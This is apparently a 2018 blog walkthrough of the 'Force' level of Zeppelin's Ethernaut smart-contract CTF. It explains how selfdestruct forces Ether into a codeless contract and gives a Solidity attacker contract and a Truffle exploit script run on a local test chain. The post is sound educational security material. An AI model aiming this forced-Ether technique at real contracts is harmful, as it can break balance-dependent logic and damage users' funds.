Title: Solving Zeppelin's Ethernaut CTF - Force
Date: 2018-11-23 23:30
Tags: ethereum, solidity, ctf, smart contracts
Category: Ethereum
Slug: solving-zeppelin-ethernaut-ctf-force
Summary: Post #8 of a series in which we tackle the challenges in the [Ethernaut CTF by Zeppelin](https://ethernaut.zeppelin.solutions/){:target="_blank",:rel="noopener"}. All contracts have a hidden self-destruct button. Did you known that? Read on, and see it for yourself.

## Introduction
In [Force](https://ethernaut.zeppelin.solutions/level/0x24d661beb31b85a7d775272d7841f80e662c283b), we need to make the balance of the Force contract greater than zero. In previous challenges we learned how to send transactions to contracts both from other contracts or using the `web3` library. Along these transactions, we would be allowed to send ether as long as the transferee had some kind of `payable` function (be it the constructor, a custom one and/or the fallback).

However, the Force contract does not have any code. I mean, **none**. How are we supposed to deposit Ether into it ? Well, luckily, we have an ace under the sleeve.

## OK contract, selfdestruct
I don't know if you were aware of this, but there's a way to "remove" code from the blockchain. Just code, external accounts cannot be removed from the state.

Every Ethereum smart contract has a hidden `selfdestruct` button, which can pressed at any time to blow the whole thing up. With one little addition: all Ether deposited in the destroyed contract can be automatically sent to whichever other account the contract (i.e. the developer) designates. This happens no matter what.

In other words, any contract can receive Ether at any time, regardless of the logic that it may implement in its code (if it has any *:wink:*). This is the reason why it is considered dangerous to bound the logic of sensible actions to the amount of Ether in balance.

For more details about `selfdestruct`, as always, refer to [the Solidity docs on selfdestruct](https://solidity.readthedocs.io/en/v0.4.25/introduction-to-smart-contracts.html#self-destruct).

We've now found a way through which a contract could send Ether to the codeless Force contract, thus incrementing its balance. So let's do it!.

## Attacking Force
To begin with, code an attacker contract to be sacrificed. Something like the following will do the trick. In the constructor we're just setting the victim address, while in the `destruct` function we just `selfdestruct` the contract, targetting the victim.

~~~solidity
pragma solidity ^0.4.18;

contract ForceAttack {
    address forceAddress;

    function ForceAttack(address _addr) public payable {
        forceAddress = _addr;
    }

    function destruct() public {
        // Execute selfdestruct
        // sending all remaining Ether to forceAddress
        selfdestruct(forceAddress);
    }
}
~~~

Let's see now how to interact with `ForceAttack` and trigger the attack through `web3`. As always, create a new file under the `exploits` folder called `force.exploit.js` and keep the same exploit structure we've been using since the first challenge.

~~~javascript
const ForceContract = artifacts.require('Force')
const ForceAttackContract = artifacts.require('ForceAttack')
const assert = require('assert')

async function execute(callback) {
    // Get a reference to the deployed Force contract
    const contractForce = await ForceContract.deployed()

    // Deploy new contract with initial balance of 5 ETH
    const INITIAL_BALANCE = 5
    const attackerContract = await ForceAttackContract.new(contractForce.address, {
        value: web3.toWei(INITIAL_BALANCE, 'ether')
    })
    
    // Initial balance of Force contract should be 0
    let balance = await web3.eth.getBalance(contractForce.address)
    assert.equal(balance, 0)
    console.log(`Initial balance: ${balance} ETH`)
    
    await attackerContract.destruct()
    
    // Once the transaction is done, final balance of Force contract must have changed
    balance = web3.fromWei(await web3.eth.getBalance(contractForce.address), 'ether')
    assert.equal(balance, INITIAL_BALANCE)
    console.log(`Final balance: ${balance} ETH`)

    callback()
}

module.exports = execute
~~~

I've added some comments to the exploit, though it is as self-explanatory as can be:

- Deploy the attacker contract
- Call `destruct` function
- Pass challenge :)

The rest are just utilities to validate and log each step of the attack.

So that's it! Make sure that you've deployed the Force contract to `ganache` before running the exploit with `npx truffle exec exploits/force.exploit.js`.

Even though the challenge may have been a little basic, it taught us a new feature of smart contracts that we'd never seen before, which might come in handy at some point.

You can find the whole [exploit](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/exploits/force.exploit.js) and the [attacker contract](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/contracts/ForceAttack.sol) at the GitHub repo.

For the next post, be ready to do some Ethereum lockpicking, because we are gonna have to unlock [Vault](https://ethernaut.zeppelin.solutions/level/0xe77b0bea3f019b1df2c9663c823a2ae65afb6a5f). 
